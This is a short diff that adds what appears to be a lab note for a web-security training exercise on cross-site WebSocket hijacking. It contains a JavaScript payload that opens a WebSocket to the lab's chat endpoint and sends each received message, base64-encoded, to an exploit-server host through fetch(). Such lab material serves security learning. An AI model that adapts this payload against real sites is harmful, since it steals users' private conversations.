@@ -1,0 +1,18 @@
+Deliver our initial payload:
+------------------------------------------------------------------------------
+var newWebSocket = new WebSocket(
+    "wss://OUR-ID.web-security-academy.net/chat"
+);
+
+newWebSocket.onopen = function (evt) {
+       newWebSocket.send("READY");
+       res(newWebSocket);
+};
+
+newWebSocket.onmessage = function (evt) {
+    var message = evt.data;
+    fetch("https://exploit-OUR-EXPLOIT-ID.exploit-server.net/exploit?message=" + 
+        btoa(message)
+    );
+};
+-------------------------------------------------------------------------------
